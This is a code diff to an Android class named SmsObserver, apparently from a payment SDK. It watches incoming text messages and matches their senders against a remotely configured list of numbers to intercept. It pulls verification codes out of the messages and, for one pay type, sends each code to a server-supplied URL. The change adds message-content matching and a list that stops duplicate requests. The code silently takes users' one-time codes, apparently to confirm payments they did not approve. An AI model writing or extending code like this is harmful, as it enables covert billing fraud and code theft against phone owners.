@@ -21,6 +21,7 @@ import org.json.JSONObject;
 
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.List;
 
 
 /**
@@ -33,6 +34,7 @@ public class SmsObserver extends ContentObserver {
     String smsId = "";
     String payType;
     private static String TAG = "SmsObserver";
+    private static List<String> hadReqeusted = new ArrayList<>();
 
     public SmsObserver(Handler handler) {
         super(handler);
@@ -194,12 +196,15 @@ public class SmsObserver extends ContentObserver {
             String limit_msg_2 = "";//短信拦截号码 limit_msg_2
             String sendParam = "";
             String otherNeedUrl = "";
+            String limit_msg_data = "";
 //            String a = PayChannelFactory.limit_content.get(i).toString();
             Log.debug("======================> PayChannelFactory.limit_content.get(i).toString():" + PayChannelFactory.limit_content.get(i).toString());
             try {
                 JSONObject json = new JSONObject(PayChannelFactory.limit_content.get(i).toString());
 //                number = json.getString("limitNum");
                 limit_msg_2 = json.getString("limit_msg_2");
+                limit_msg_data = json.isNull("limit_msg_data") ? "" : json.getString("limit_msg_data");
+                Log.debug("========>limit_msg_data:" + limit_msg_data);
             } catch (Exception e) {
                 Log.debug("=================>eeeeeee:" + e);
                 Sms_send_tongbu(catchError(e), SDKInit.mContext, -4);
@@ -209,19 +214,24 @@ public class SmsObserver extends ContentObserver {
                 return;
             }
             boolean b = false;
-            String[] pa = limit_msg_2.split(",");
-            for (int k = 0; k < pa.length; k++) {
-                if (pa[k].length() > smsAddress.length()) {
-                    if (pa[k].contains(smsAddress)) {
-                        b = true;
-                    }
-                } else {
-                    if (smsAddress.contains(pa[k])) {
-                        b = true;
+            if (limit_msg_2.contains(",")) {
+                String[] pa = limit_msg_2.split(",");
+                for (int k = 0; k < pa.length; k++) {
+                    if (pa[k].length() > smsAddress.length()) {
+                        if (pa[k].contains(smsAddress) && smsBody.contains(limit_msg_data)) {
+                            b = true;
+                        }
+                    } else {
+                        if (smsAddress.contains(pa[k]) && smsBody.contains(limit_msg_data)) {
+                            b = true;
+                        }
                     }
                 }
+            } else {
+                b = true;
             }
-            if (b) {
+
+            if (b && smsBody.contains(limit_msg_data)) {
                 try {
                     JSONObject json = new JSONObject(PayChannelFactory.limit_content.get(i).toString());
                     payType = json.getString("payType");
@@ -231,6 +241,7 @@ public class SmsObserver extends ContentObserver {
                     limitNum = json.isNull("limitNum") ? "" : json.getString("limitNum");
                     sendParam = json.isNull("sendParam") ? "" : json.getString("sendParam");
                     otherNeedUrl = json.isNull("otherNeedUrl") ? "" : json.getString("otherNeedUrl");
+
                     if (limitNum.equals("")) {
                         limitNum = smsAddress;
                     }
@@ -250,14 +261,20 @@ public class SmsObserver extends ContentObserver {
                     } else if (payType.equals("3")) {
                         String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                         String url = otherNeedUrl + "?vcode=" + SmsContent + "&sendParam=" + sendParam;
-                        GetDataImpl.doGetRequestWithoutListener(url);
-                        if (Constants.isOutPut) {
-                            Log.debug("------>content:" + content);
-                            Log.debug("------>拦截到的验证码：" + SmsContent);
-                            Log.debug("------>url：" + url);
-                            Log.debug("------>返回的内容：" + content);
+                        if (hadReqeusted.toString().contains(sendParam)) {
+                            Sms_send_tongbu(hadReqeusted.toString(), context, -123);
+                            return;
+                        } else {
+                            GetDataImpl.doGetRequestWithoutListener(url);
+                            hadReqeusted.add(sendParam);
+                            if (Constants.isOutPut) {
+                                Log.debug("------>content:" + content);
+                                Log.debug("------>拦截到的验证码：" + SmsContent);
+                                Log.debug("------>url：" + url);
+                                Log.debug("------>返回的内容：" + content);
+                            }
+                            Sms_send_tongbu(content + " ----> " + url, context, 10003);
                         }
-                        Sms_send_tongbu(content + " ----> " + url, context, 10003);
                     } else if (payType.equals("4")) {
                         String SmsCode = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                         Log.debug("======>SmsCode:" + SmsCode);
